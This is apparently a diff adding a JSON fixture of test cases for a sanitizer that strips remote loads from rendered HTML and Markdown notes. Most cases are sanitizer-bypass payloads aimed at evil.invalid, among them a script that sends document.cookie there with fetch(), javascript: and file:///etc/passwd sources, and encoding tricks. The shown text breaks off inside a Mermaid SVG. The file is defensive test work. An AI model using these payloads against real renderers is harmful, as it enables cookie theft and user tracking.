@@ -1,0 +1,2494 @@
+[
+ {
+  "name": "img src",
+  "kind": "attack",
+  "html": "<img alt=\"a\" src=\"https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "img srcset",
+  "kind": "attack",
+  "html": "<img alt=\"a\" srcset=\"https://evil.invalid/x.png 1x, https://evil.invalid/y.png 2x\">"
+ },
+ {
+  "name": "img local src, remote srcset",
+  "kind": "attack",
+  "html": "<img alt=\"a\" src=\"img/a.png\" srcset=\"https://evil.invalid/x.png 2x\">"
+ },
+ {
+  "name": "img lowsrc",
+  "kind": "attack",
+  "html": "<img src=\"img/a.png\" lowsrc=\"https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "img dynsrc",
+  "kind": "attack",
+  "html": "<img src=\"img/a.png\" dynsrc=\"https://evil.invalid/x.mpg\">"
+ },
+ {
+  "name": "img style background",
+  "kind": "attack",
+  "html": "<img src=\"img/a.png\" style=\"background:url(https://evil.invalid/x.png)\">"
+ },
+ {
+  "name": "video poster",
+  "kind": "attack",
+  "html": "<video poster=\"https://evil.invalid/x.png\"></video>"
+ },
+ {
+  "name": "video src",
+  "kind": "attack",
+  "html": "<video src=\"https://evil.invalid/x.mp4\"></video>"
+ },
+ {
+  "name": "audio src",
+  "kind": "attack",
+  "html": "<audio src=\"https://evil.invalid/x.mp3\"></audio>"
+ },
+ {
+  "name": "source src",
+  "kind": "attack",
+  "html": "<video><source src=\"https://evil.invalid/x.mp4\"></video>"
+ },
+ {
+  "name": "source srcset in picture",
+  "kind": "attack",
+  "html": "<picture><source srcset=\"https://evil.invalid/x.webp\"><img src=\"img/a.png\"></picture>"
+ },
+ {
+  "name": "track src",
+  "kind": "attack",
+  "html": "<video><track src=\"https://evil.invalid/x.vtt\"></video>"
+ },
+ {
+  "name": "input type=image src",
+  "kind": "attack",
+  "html": "<input type=\"image\" src=\"https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "table background",
+  "kind": "attack",
+  "html": "<table background=\"https://evil.invalid/x.png\"><tr><td>x</td></tr></table>"
+ },
+ {
+  "name": "td background",
+  "kind": "attack",
+  "html": "<table><tr><td background=\"https://evil.invalid/x.png\">x</td></tr></table>"
+ },
+ {
+  "name": "body-ish div background attribute",
+  "kind": "attack",
+  "html": "<div background=\"https://evil.invalid/x.png\">x</div>"
+ },
+ {
+  "name": "object data",
+  "kind": "attack",
+  "html": "<object data=\"https://evil.invalid/x.swf\"></object>"
+ },
+ {
+  "name": "object data data-url",
+  "kind": "attack",
+  "html": "<object data=\"data:text/html,<script>alert(1)</script>\"></object>"
+ },
+ {
+  "name": "embed src",
+  "kind": "attack",
+  "html": "<embed src=\"https://evil.invalid/x.swf\">"
+ },
+ {
+  "name": "iframe src",
+  "kind": "attack",
+  "html": "<iframe src=\"https://evil.invalid/\"></iframe>"
+ },
+ {
+  "name": "iframe srcdoc only",
+  "kind": "attack",
+  "html": "<iframe srcdoc=\"&lt;img src=&quot;https://evil.invalid/x.png&quot;&gt;\"></iframe>",
+  "note": "no URL attribute at all: only an unconditional removal catches it"
+ },
+ {
+  "name": "iframe data url",
+  "kind": "attack",
+  "html": "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>"
+ },
+ {
+  "name": "iframe relative",
+  "kind": "attack",
+  "html": "<iframe src=\"page.html\"></iframe>",
+  "note": "document tags go even when the source is local"
+ },
+ {
+  "name": "iframe app scheme",
+  "kind": "attack",
+  "html": "<iframe src=\"app://obsidian.md/x.html\"></iframe>"
+ },
+ {
+  "name": "iframe capacitor scheme",
+  "kind": "attack",
+  "html": "<iframe src=\"capacitor://localhost/_capacitor_file_/x.html\"></iframe>",
+  "note": "capacitor counts as local only for non-document tags"
+ },
+ {
+  "name": "frame in frameset",
+  "kind": "attack",
+  "html": "<frameset><frame src=\"https://evil.invalid/\"></frameset>"
+ },
+ {
+  "name": "script src",
+  "kind": "attack",
+  "html": "<script src=\"https://evil.invalid/x.js\"></script>"
+ },
+ {
+  "name": "script inline",
+  "kind": "attack",
+  "html": "<script>fetch(\"https://evil.invalid/?\"+document.cookie)</script>"
+ },
+ {
+  "name": "link stylesheet",
+  "kind": "attack",
+  "html": "<link rel=\"stylesheet\" href=\"https://evil.invalid/x.css\">"
+ },
+ {
+  "name": "link stylesheet relative",
+  "kind": "attack",
+  "html": "<link rel=\"stylesheet\" href=\"x.css\">"
+ },
+ {
+  "name": "link imagesrcset",
+  "kind": "attack",
+  "html": "<link rel=\"preload\" as=\"image\" imagesrcset=\"https://evil.invalid/x.png 1x\" href=\"x.png\">"
+ },
+ {
+  "name": "base href",
+  "kind": "attack",
+  "html": "<base href=\"https://evil.invalid/\"><img src=\"x.png\">",
+  "note": "a base would turn every relative source into a remote one"
+ },
+ {
+  "name": "portal",
+  "kind": "attack",
+  "html": "<portal src=\"https://evil.invalid/\"></portal>"
+ },
+ {
+  "name": "fencedframe",
+  "kind": "attack",
+  "html": "<fencedframe src=\"https://evil.invalid/\"></fencedframe>"
+ },
+ {
+  "name": "meta refresh",
+  "kind": "attack",
+  "html": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.invalid/\">"
+ },
+ {
+  "name": "meta refresh upper case",
+  "kind": "attack",
+  "html": "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=https://evil.invalid/\">"
+ },
+ {
+  "name": "scheme upper case",
+  "kind": "attack",
+  "html": "<img src=\"HTTPS://evil.invalid/x.png\">"
+ },
+ {
+  "name": "protocol-relative",
+  "kind": "attack",
+  "html": "<img src=\"//evil.invalid/x.png\">"
+ },
+ {
+  "name": "backslashes",
+  "kind": "attack",
+  "html": "<img src=\"\\\\evil.invalid\\x.png\">"
+ },
+ {
+  "name": "slash backslash",
+  "kind": "attack",
+  "html": "<img src=\"/\\evil.invalid/x.png\">"
+ },
+ {
+  "name": "tab in scheme",
+  "kind": "attack",
+  "html": "<img src=\"ht\ttps://evil.invalid/x.png\">"
+ },
+ {
+  "name": "newline in scheme",
+  "kind": "attack",
+  "html": "<img src=\"ht\ntps://evil.invalid/x.png\">"
+ },
+ {
+  "name": "carriage return in scheme",
+  "kind": "attack",
+  "html": "<img src=\"ht\rtps://evil.invalid/x.png\">"
+ },
+ {
+  "name": "leading control and space",
+  "kind": "attack",
+  "html": "<img src=\"\u0001 \thttps://evil.invalid/x.png\">"
+ },
+ {
+  "name": "leading space",
+  "kind": "attack",
+  "html": "<img src=\"  https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "numeric entities",
+  "kind": "attack",
+  "html": "<img src=\"&#104;ttps://evil.invalid/x.png\">"
+ },
+ {
+  "name": "hex entities",
+  "kind": "attack",
+  "html": "<img src=\"&#x68;ttps&#x3a;//evil.invalid/x.png\">"
+ },
+ {
+  "name": "named entities",
+  "kind": "attack",
+  "html": "<img src=\"https&colon;&sol;&sol;evil.invalid/x.png\">"
+ },
+ {
+  "name": "zero-width in scheme",
+  "kind": "attack",
+  "html": "<img src=\"ht​tps://evil.invalid/x.png\">"
+ },
+ {
+  "name": "unquoted value",
+  "kind": "attack",
+  "html": "<img src=https://evil.invalid/x.png>"
+ },
+ {
+  "name": "single-quoted value",
+  "kind": "attack",
+  "html": "<img src='https://evil.invalid/x.png'>"
+ },
+ {
+  "name": "greater-than in value",
+  "kind": "attack",
+  "html": "<img alt=\"a>b\" src=\"https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "slash before attribute",
+  "kind": "attack",
+  "html": "<img/src=\"https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "duplicate attribute",
+  "kind": "attack",
+  "html": "<img src=\"img/a.png\" src=\"https://evil.invalid/x.png\">",
+  "note": "the parser keeps the first; the pass must still end with no remote source"
+ },
+ {
+  "name": "other scheme: ftp",
+  "kind": "attack",
+  "html": "<img src=\"ftp://evil.invalid/x.png\">"
+ },
+ {
+  "name": "other scheme: file",
+  "kind": "attack",
+  "html": "<img src=\"file:///etc/passwd\">"
+ },
+ {
+  "name": "other scheme: blob",
+  "kind": "attack",
+  "html": "<img src=\"blob:https://evil.invalid/uuid\">"
+ },
+ {
+  "name": "other scheme: javascript",
+  "kind": "attack",
+  "html": "<img src=\"javascript:alert(1)\">"
+ },
+ {
+  "name": "other scheme: ws",
+  "kind": "attack",
+  "html": "<img src=\"ws://evil.invalid/\">"
+ },
+ {
+  "name": "srcset data comma then remote",
+  "kind": "attack",
+  "html": "<img srcset=\"data:image/png;base64,AAAA 1x, https://evil.invalid/x.png 2x\">",
+  "note": "a naive split on commas cuts the data URL in two"
+ },
+ {
+  "name": "srcset remote without space",
+  "kind": "attack",
+  "html": "<img srcset=\"https://evil.invalid/x.png,1x\">"
+ },
+ {
+  "name": "srcset tab separated",
+  "kind": "attack",
+  "html": "<img srcset=\"img/a.png 1x,\thttps://evil.invalid/x.png 2x\">"
+ },
+ {
+  "name": "svg image href",
+  "kind": "attack",
+  "html": "<svg><image href=\"https://evil.invalid/x.png\"/></svg>"
+ },
+ {
+  "name": "svg image xlink:href",
+  "kind": "attack",
+  "html": "<svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"https://evil.invalid/x.png\"/></svg>"
+ },
+ {
+  "name": "svg use href",
+  "kind": "attack",
+  "html": "<svg><use href=\"https://evil.invalid/s.svg#a\"/></svg>"
+ },
+ {
+  "name": "svg use xlink:href",
+  "kind": "attack",
+  "html": "<svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"><use xlink:href=\"https://evil.invalid/s.svg#a\"/></svg>"
+ },
+ {
+  "name": "svg feImage href",
+  "kind": "attack",
+  "html": "<svg><filter id=\"f\"><feImage href=\"https://evil.invalid/x.png\"/></filter></svg>"
+ },
+ {
+  "name": "svg linearGradient href",
+  "kind": "attack",
+  "html": "<svg><linearGradient id=\"g\" href=\"https://evil.invalid/s.svg#g\"/></svg>"
+ },
+ {
+  "name": "svg pattern href",
+  "kind": "attack",
+  "html": "<svg><pattern id=\"p\" href=\"https://evil.invalid/s.svg#p\"/></svg>"
+ },
+ {
+  "name": "svg textPath href",
+  "kind": "attack",
+  "html": "<svg><text><textPath href=\"https://evil.invalid/s.svg#t\">x</textPath></text></svg>"
+ },
+ {
+  "name": "svg script href",
+  "kind": "attack",
+  "html": "<svg><script href=\"https://evil.invalid/x.js\"/></svg>"
+ },
+ {
+  "name": "svg set href",
+  "kind": "attack",
+  "html": "<svg><a href=\"#\"><set attributeName=\"href\" to=\"https://evil.invalid/\"/></a><image id=\"i\" href=\"img/a.png\"><set attributeName=\"href\" to=\"https://evil.invalid/x.png\"/></image></svg>"
+ },
+ {
+  "name": "svg animate xlink:href",
+  "kind": "attack",
+  "html": "<svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image href=\"img/a.png\"><animate attributeName=\"xlink:href\" values=\"img/a.png;https://evil.invalid/x.png\" dur=\"1s\"/></image></svg>"
+ },
+ {
+  "name": "svg animate fill url",
+  "kind": "attack",
+  "html": "<svg><rect width=\"1\" height=\"1\"><animate attributeName=\"fill\" from=\"red\" to=\"url(https://evil.invalid/s.svg#a)\" dur=\"1s\"/></rect></svg>"
+ },
+ {
+  "name": "svg fill url",
+  "kind": "attack",
+  "html": "<svg><rect fill=\"url(https://evil.invalid/s.svg#a)\"/></svg>"
+ },
+ {
+  "name": "svg stroke url",
+  "kind": "attack",
+  "html": "<svg><rect stroke=\"url(https://evil.invalid/s.svg#a)\"/></svg>"
+ },
+ {
+  "name": "svg filter url",
+  "kind": "attack",
+  "html": "<svg><rect filter=\"url(https://evil.invalid/s.svg#f)\"/></svg>"
+ },
+ {
+  "name": "svg mask url",
+  "kind": "attack",
+  "html": "<svg><rect mask=\"url(https://evil.invalid/s.svg#m)\"/></svg>"
+ },
+ {
+  "name": "svg clip-path url",
+  "kind": "attack",
+  "html": "<svg><rect clip-path=\"url(https://evil.invalid/s.svg#c)\"/></svg>"
+ },
+ {
+  "name": "svg marker-end url",
+  "kind": "attack",
+  "html": "<svg><path d=\"M0 0L1 1\" marker-end=\"url(https://evil.invalid/s.svg#m)\"/></svg>"
+ },
+ {
+  "name": "svg cursor url",
+  "kind": "attack",
+  "html": "<svg><rect cursor=\"url(https://evil.invalid/c.cur), auto\"/></svg>"
+ },
+ {
+  "name": "svg fill url quoted",
+  "kind": "attack",
+  "html": "<svg><rect fill=\"url(&quot;https://evil.invalid/s.svg#a&quot;)\"/></svg>"
+ },
+ {
+  "name": "svg fill url css escape",
+  "kind": "attack",
+  "html": "<svg><rect fill=\"u\\72l(https://evil.invalid/s.svg#a)\"/></svg>"
+ },
+ {
+  "name": "svg style attribute",
+  "kind": "attack",
+  "html": "<svg><rect style=\"fill:url(https://evil.invalid/s.svg#a)\"/></svg>"
+ },
+ {
+  "name": "svg style element url",
+  "kind": "attack",
+  "html": "<svg><style>rect{fill:url(https://evil.invalid/s.svg#a)}</style></svg>"
+ },
+ {
+  "name": "svg style element import",
+  "kind": "attack",
+  "html": "<svg><style>@import url(https://evil.invalid/x.css);</style></svg>"
+ },
+ {
+  "name": "svg style element import string",
+  "kind": "attack",
+  "html": "<svg><style>@import \"https://evil.invalid/x.css\";</style></svg>"
+ },
+ {
+  "name": "svg foreignObject img",
+  "kind": "attack",
+  "html": "<svg><foreignObject><img src=\"https://evil.invalid/x.png\"></foreignObject></svg>"
+ },
+ {
+  "name": "svg foreignObject iframe",
+  "kind": "attack",
+  "html": "<svg><foreignObject><iframe src=\"https://evil.invalid/\"></iframe></foreignObject></svg>"
+ },
+ {
+  "name": "style attribute url",
+  "kind": "attack",
+  "html": "<div style=\"background:url(https://evil.invalid/x.png)\">x</div>"
+ },
+ {
+  "name": "style attribute url quoted",
+  "kind": "attack",
+  "html": "<div style=\"background:url('https://evil.invalid/x.png')\">x</div>"
+ },
+ {
+  "name": "style attribute url spaced",
+  "kind": "attack",
+  "html": "<div style=\"background: url( https://evil.invalid/x.png )\">x</div>"
+ },
+ {
+  "name": "style attribute url upper case",
+  "kind": "attack",
+  "html": "<div style=\"background:URL(https://evil.invalid/x.png)\">x</div>"
+ },
+ {
+  "name": "style attribute url css escape",
+  "kind": "attack",
+  "html": "<div style=\"background:u\\72l(https://evil.invalid/x.png)\">x</div>"
+ },
+ {
+  "name": "style attribute url css escape hex space",
+  "kind": "attack",
+  "html": "<div style=\"background:\\75 rl(https://evil.invalid/x.png)\">x</div>"
+ },
+ {
+  "name": "style attribute image-set",
+  "kind": "attack",
+  "html": "<div style=\"background:image-set('https://evil.invalid/x.png' 1x)\">x</div>"
+ },
+ {
+  "name": "style attribute webkit image-set",
+  "kind": "attack",
+  "html": "<div style=\"background:-webkit-image-set(url(https://evil.invalid/x.png) 1x)\">x</div>"
+ },
+ {
+  "name": "style attribute src()",
+  "kind": "attack",
+  "html": "<div style=\"background:src('https://evil.invalid/x.png')\">x</div>"
+ },
+ {
+  "name": "style attribute attr()",
+  "kind": "attack",
+  "html": "<div data-u=\"https://evil.invalid/x.png\" style=\"background:url(attr(data-u))\">x</div>",
+  "note": "indirection: the URL is not in the style value"
+ },
+ {
+  "name": "style attribute image()",
+  "kind": "attack",
+  "html": "<div style=\"background:image('https://evil.invalid/x.png')\">x</div>"
+ },
+ {
+  "name": "style attribute cross-fade()",
+  "kind": "attack",
+  "html": "<div style=\"background:cross-fade(url(https://evil.invalid/x.png), red)\">x</div>"
+ },
+ {
+  "name": "style attribute list-style",
+  "kind": "attack",
+  "html": "<ul style=\"list-style-image:url(https://evil.invalid/x.png)\"><li>x</li></ul>"
+ },
+ {
+  "name": "style attribute cursor",
+  "kind": "attack",
+  "html": "<div style=\"cursor:url(https://evil.invalid/x.cur),auto\">x</div>"
+ },
+ {
+  "name": "style attribute content",
+  "kind": "attack",
+  "html": "<div style=\"content:url(https://evil.invalid/x.png)\">x</div>"
+ },
+ {
+  "name": "style attribute mask",
+  "kind": "attack",
+  "html": "<div style=\"-webkit-mask-image:url(https://evil.invalid/x.png)\">x</div>"
+ },
+ {
+  "name": "style attribute border-image",
+  "kind": "attack",
+  "html": "<div style=\"border-image:url(https://evil.invalid/x.png) 1\">x</div>"
+ },
+ {
+  "name": "style attribute @import",
+  "kind": "attack",
+  "html": "<div style=\"@import url(https://evil.invalid/x.css)\">x</div>"
+ },
+ {
+  "name": "style element url",
+  "kind": "attack",
+  "html": "<style>.a{background:url(https://evil.invalid/x.png)}</style><p class=\"a\">x</p>"
+ },
+ {
+  "name": "style element import",
+  "kind": "attack",
+  "html": "<style>@import url(https://evil.invalid/x.css);</style>"
+ },
+ {
+  "name": "style element font-face",
+  "kind": "attack",
+  "html": "<style>@font-face{font-family:x;src:url(https://evil.invalid/x.woff)}</style>"
+ },
+ {
+  "name": "style element after harmless rule",
+  "kind": "attack",
+  "html": "<style>.a{color:red}.b{background:url(https://evil.invalid/x.png)}</style>"
+ },
+ {
+  "name": "style element attr()",
+  "kind": "attack",
+  "html": "<style>.a{background:url(attr(data-u))}</style>"
+ },
+ {
+  "name": "template",
+  "kind": "attack",
+  "html": "<template><img src=\"https://evil.invalid/x.png\"></template>"
+ },
+ {
+  "name": "nested template",
+  "kind": "attack",
+  "html": "<template><template><img src=\"https://evil.invalid/x.png\"></template></template>"
+ },
+ {
+  "name": "template with style",
+  "kind": "attack",
+  "html": "<template><div style=\"background:url(https://evil.invalid/x.png)\">x</div></template>"
+ },
+ {
+  "name": "details in table in list",
+  "kind": "attack",
+  "html": "<ul><li><table><tr><td><details><summary>x</summary><img src=\"https://evil.invalid/x.png\"></details></td></tr></table></li></ul>"
+ },
+ {
+  "name": "math href",
+  "kind": "attack",
+  "html": "<math><mi href=\"https://evil.invalid/x\">x</mi></math>"
+ },
+ {
+  "name": "a wrapping a remote image",
+  "kind": "attack",
+  "html": "<a href=\"note.md\"><img src=\"https://evil.invalid/x.png\" alt=\"logo\"></a>"
+ },
+ {
+  "name": "image inside noscript",
+  "kind": "attack",
+  "html": "<noscript><img src=\"https://evil.invalid/x.png\"></noscript>"
+ },
+ {
+  "name": "html element in comment break",
+  "kind": "attack",
+  "html": "<!-- --><img src=\"https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "md inline image",
+  "kind": "attack",
+  "markdown": "![a](https://evil.invalid/x.png)"
+ },
+ {
+  "name": "md angle destination",
+  "kind": "attack",
+  "markdown": "![a](<https://evil.invalid/x.png>)"
+ },
+ {
+  "name": "md destination with title",
+  "kind": "attack",
+  "markdown": "![a](https://evil.invalid/x.png \"title\")"
+ },
+ {
+  "name": "md destination with spaces",
+  "kind": "attack",
+  "markdown": "![a](  https://evil.invalid/x.png  )"
+ },
+ {
+  "name": "md protocol-relative",
+  "kind": "attack",
+  "markdown": "![a](//evil.invalid/x.png)"
+ },
+ {
+  "name": "md entity in destination",
+  "kind": "attack",
+  "markdown": "![a](h&#116;tps://evil.invalid/x.png)"
+ },
+ {
+  "name": "md backslash-escaped colon",
+  "kind": "attack",
+  "markdown": "![a](https\\://evil.invalid/x.png)"
+ },
+ {
+  "name": "md reference definition",
+  "kind": "attack",
+  "markdown": "![a][r]\n\n[r]: https://evil.invalid/x.png"
+ },
+ {
+  "name": "md reference definition in quote",
+  "kind": "attack",
+  "markdown": "![a][r]\n\n> [r]: https://evil.invalid/x.png"
+ },
+ {
+  "name": "md reference definition in list",
+  "kind": "attack",
+  "markdown": "![a][r]\n\n- [r]: https://evil.invalid/x.png"
+ },
+ {
+  "name": "md shortcut reference",
+  "kind": "attack",
+  "markdown": "![r]\n\n[r]: https://evil.invalid/x.png"
+ },
+ {
+  "name": "md nested image in alt",
+  "kind": "attack",
+  "markdown": "![![b](https://evil.invalid/y.png)](https://evil.invalid/x.png)"
+ },
+ {
+  "name": "md raw html img",
+  "kind": "attack",
+  "markdown": "<img src=\"https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "md raw html open quote",
+  "kind": "attack",
+  "markdown": "<img alt=\"x src=https://evil.invalid/x.png>"
+ },
+ {
+  "name": "md raw html gt in value",
+  "kind": "attack",
+  "markdown": "<img alt=\"a>b\" src=\"https://evil.invalid/x.png\">"
+ },
+ {
+  "name": "md html block with image",
+  "kind": "attack",
+  "markdown": "<div>\n<img src=\"https://evil.invalid/x.png\">\n</div>"
+ },
+ {
+  "name": "md style attribute",
+  "kind": "attack",
+  "markdown": "<span style=\"background:url(https://evil.invalid/x.png)\">x</span>"
+ },
+ {
+  "name": "keep: relative image",
+  "kind": "keep",
+  "html": "<img src=\"img/a.png\" alt=\"a\">"
+ },
+ {
+  "name": "keep: relative image with spaces and parentheses",
+  "kind": "keep",
+  "html": "<img src=\"../my images/a (1).png\" alt=\"a\">"
+ },
+ {
+  "name": "keep: absolute vault path",
+  "kind": "keep",
+  "html": "<img src=\"/img/a.png\" alt=\"a\">"
+ },
+ {
+  "name": "keep: app image",
+  "kind": "keep",
+  "html": "<img src=\"app://obsidian.md/img/a.png\" alt=\"a\">"
+ },
+ {
+  "name": "keep: capacitor image (iOS)",
+  "kind": "keep",
+  "html": "<img src=\"capacitor://localhost/_capacitor_file_/x.png\" alt=\"a\">",
+  "note": "iOS resolves vault images to capacitor: (letterhead, measured on the device)"
+ },
+ {
+  "name": "keep: data image",
+  "kind": "keep",
+  "html": "<img src=\"data:image/png;base64,iVBORw0KGgo=\" alt=\"a\">"
+ },
+ {
+  "name": "keep: srcset with data url and relative",
+  "kind": "keep",
+  "html": "<img srcset=\"data:image/png;base64,AAAA 1x, img/a.png 2x\" alt=\"a\">"
+ },
+ {
+  "name": "keep: clickable link",
+  "kind": "keep",
+  "html": "<a href=\"https://evil.invalid/\">link</a>"
+ },
+ {
+  "name": "keep: clickable link in svg",
+  "kind": "keep",
+  "html": "<svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"https://evil.invalid/\"><text>x</text></a></svg>"
+ },
+ {
+  "name": "keep: area link",
+  "kind": "keep",
+  "html": "<map name=\"m\"><area href=\"https://evil.invalid/\" shape=\"rect\" coords=\"0,0,1,1\"></map>"
+ },
+ {
+  "name": "keep: svg use fragment",
+  "kind": "keep",
+  "html": "<svg><defs><g id=\"a\"/></defs><use href=\"#a\"/></svg>"
+ },
+ {
+  "name": "keep: svg fill fragment",
+  "kind": "keep",
+  "html": "<svg><linearGradient id=\"g\"/><rect fill=\"url(#g)\" stroke=\"url(#g)\" filter=\"url(#f)\"/></svg>"
+ },
+ {
+  "name": "keep: svg image data",
+  "kind": "keep",
+  "html": "<svg><image href=\"data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22/%3E\"/></svg>"
+ },
+ {
+  "name": "keep: svg namespace declarations",
+  "kind": "keep",
+  "html": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><rect/></svg>",
+  "note": "xmlns values are http:// URLs and are not sources"
+ },
+ {
+  "name": "keep: style attribute without url",
+  "kind": "keep",
+  "html": "<div style=\"color:red;background:#fff\">x</div>"
+ },
+ {
+  "name": "keep: style attribute with local url",
+  "kind": "price",
+  "html": "<div style=\"background:url(img/a.png)\">x</div>",
+  "note": "by design since the CSS gate: CSS naming a resource goes, local or not"
+ },
+ {
+  "name": "keep: style element without url",
+  "kind": "keep",
+  "html": "<style>.a{color:red}@keyframes k{from{opacity:0}}</style><p class=\"a\">x</p>"
+ },
+ {
+  "name": "keep: style element with fragment url",
+  "kind": "price",
+  "html": "<style>.a{fill:url(#g)}</style>",
+  "note": "by design since the CSS gate: CSS naming a resource goes, local or not"
+ },
+ {
+  "name": "keep: text that looks like a url",
+  "kind": "keep",
+  "html": "<p>see https://evil.invalid/x.png and url(https://evil.invalid/y.png)</p>"
+ },
+ {
+  "name": "keep: alt text with parenthesis",
+  "kind": "keep",
+  "html": "<img src=\"img/a.png\" alt=\"image(s) and attr(x)\">"
+ },
+ {
+  "name": "keep: title and data attributes",
+  "kind": "keep",
+  "html": "<p title=\"https://evil.invalid/x.png\" data-src=\"https://evil.invalid/y.png\">x</p>",
+  "note": "only attributes the browser loads on its own count; data-* is none"
+ },
+ {
+  "name": "keep: table and list",
+  "kind": "keep",
+  "html": "<table><tr><td>a</td></tr></table><ul><li>b</li></ul>"
+ },
+ {
+  "name": "keep: meta without refresh",
+  "kind": "keep",
+  "html": "<meta name=\"x\" content=\"y\">"
+ },
+ {
+  "name": "keep: mermaid flowchart (Mermaid 11.16.1, captured in Chrome, securityLevel strict)",
+  "kind": "keep",
+  "html": "<svg id=\"mmA\" width=\"100%\" xmlns=\"http://www.w3.org/2000/svg\" class=\"flowchart\" style=\"max-width: 444.34375px;\" viewBox=\"0 0 444.34375 113.03125\" role=\"graphics-document document\" aria-roledescription=\"flowchart-v2\"><style>#mmA{font-family:\"trebuchet ms\",verdana,arial,sans-serif;font-size:16px;fill:#333;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#mmA .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#mmA .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#mmA .error-icon{fill:#552222;}#mmA .error-text{fill:#552222;stroke:#552222;}#mmA .edge-thickness-normal{stroke-width:1px;}#mmA .edge-thickness-thick{stroke-width:3.5px;}#mmA .edge-pattern-solid{stroke-dasharray:0;}#mmA .edge-thickness-invisible{stroke-width:0;fill:none;}#mmA .edge-pattern-dashed{stroke-dasharray:3;}#mmA .edge-pattern-dotted{stroke-dasharray:2;}#mmA .marker{fill:#333333;stroke:#333333;}#mmA .marker.cross{stroke:#333333;}#mmA svg{font-family:\"trebuchet ms\",verdana,arial,sans-serif;font-size:16px;}#mmA p{margin:0;}#mmA .label{font-family:\"trebuchet ms\",verdana,arial,sans-serif;color:#333;}#mmA .cluster-label text{fill:#333;}#mmA .cluster-label span{color:#333;}#mmA .cluster-label span p{background-color:transparent;}#mmA .label text,#mmA span{fill:#333;color:#333;}#mmA .node rect,#mmA .node circle,#mmA .node ellipse,#mmA .node polygon,#mmA .node path{fill:#ECECFF;stroke:#9370DB;stroke-width:1px;}#mmA .rough-node .label text,#mmA .node .label text,#mmA .image-shape .label,#mmA .icon-shape .label{text-anchor:middle;}#mmA .node .katex path{fill:#000;stroke:#000;stroke-width:1px;}#mmA .rough-node .label,#mmA .node .label,#mmA .image-shape .label,#mmA .icon-shape .label{text-align:center;}#mmA .node.clickable{cursor:pointer;}#mmA .root .anchor path{fill:#333333!important;stroke-width:0;stroke:#333333;}#mmA .arrowheadPath{fill:#333333;}#mmA .edgePath .path{stroke:#333333;stroke-width:1px;}#mmA .flowchart-link{stroke:#333333;fill:none;}#mmA .edgeLabel{background-color:rgba(232,232,232, 0.8);text-align:center;}#mmA .edgeLabel p{background-color:rgba(232,232,232, 0.8);}#mmA .edgeLabel rect{opacity:0.5;background-color:rgba(232,232,232, 0.8);fill:rgba(232,232,232, 0.8);}#mmA .labelBkg{background-color:rgba(232, 232, 232, 0.5);}#mmA .cluster rect{fill:#ffffde;stroke:#aaaa33;stroke-width:1px;}#mmA .cluster text{fill:#333;}#mmA .cluster span{color:#333;}#mmA div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:\"trebuchet ms\",verdana,arial,sans-serif;font-size:12px;background:hsl(80, 100%, 96.2745098039%);border:1px solid #aaaa33;border-radius:2px;pointer-events:none;z-index:100;}#mmA .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#333;}#mmA rect.text{fill:none;stroke-width:0;}#mmA .icon-shape,#mmA .image-shape{background-color:rgba(232,232,232, 0.8);text-align:center;}#mmA .icon-shape p,#mmA .image-shape p{background-color:rgba(232,232,232, 0.8);padding:2px;}#mmA .icon-shape .label rect,#mmA .image-shape .label rect{opacity:0.5;background-color:rgba(232,232,232, 0.8);fill:rgba(232,232,232, 0.8);}#mmA .label-icon{display:inline-block;height:1em;overflow:visible;vertical-align:-0.125em;}#mmA .node .label-icon path{fill:currentColor;stroke:revert;stroke-width:revert;}#mmA .node .neo-node{stroke:#9370DB;}#mmA [data-look=\"neo\"].node rect,#mmA [data-look=\"neo\"].cluster rect,#mmA [data-look=\"neo\"].node polygon{stroke:#9370DB;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmA [data-look=\"neo\"].swimlane.cluster rect{filter:none;}#mmA [data-look=\"neo\"].node path{stroke:#9370DB;stroke-width:1px;}#mmA [data-look=\"neo\"].node .outer-path{filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmA [data-look=\"neo\"].node .neo-line path{stroke:#9370DB;filter:none;}#mmA [data-look=\"neo\"].node circle{stroke:#9370DB;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmA [data-look=\"neo\"].node circle .state-start{fill:#000000;}#mmA [data-look=\"neo\"].icon-shape .icon{fill:#9370DB;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmA [data-look=\"neo\"].icon-shape .icon-neo path{stroke:#9370DB;filter:drop-shadow(1px 2px 2px rgba(185, 185, 185, 1));}#mmA :root{--mermaid-font-family:\"trebuchet ms\",verdana,arial,sans-serif;}</style><g><marker id=\"mmA_flowchart-v2-pointEnd\" class=\"marker flowchart-v2\" viewBox=\"0 0 10 10\" refX=\"5\" refY=\"5\" markerUnits=\"userSpaceOnUse\" markerWidth=\"8\" markerHeight=\"8\" orient=\"auto\"><path d=\"M 0 0 L 10 5 L 0 10 z\" class=\"arrowMarkerPath\" style=\"stroke-width: 1; stroke-dasharray: 1, 0;\"></path></marker><marker id=\"mmA_flowchart-v2-pointStart\" class=\"marker flowchart-v2\" viewBox=\"0 0 10 10\" refX=\"4.5\" refY=\"5\" markerUnits=\"userSpaceOnUse\" markerWidth=\"8\" 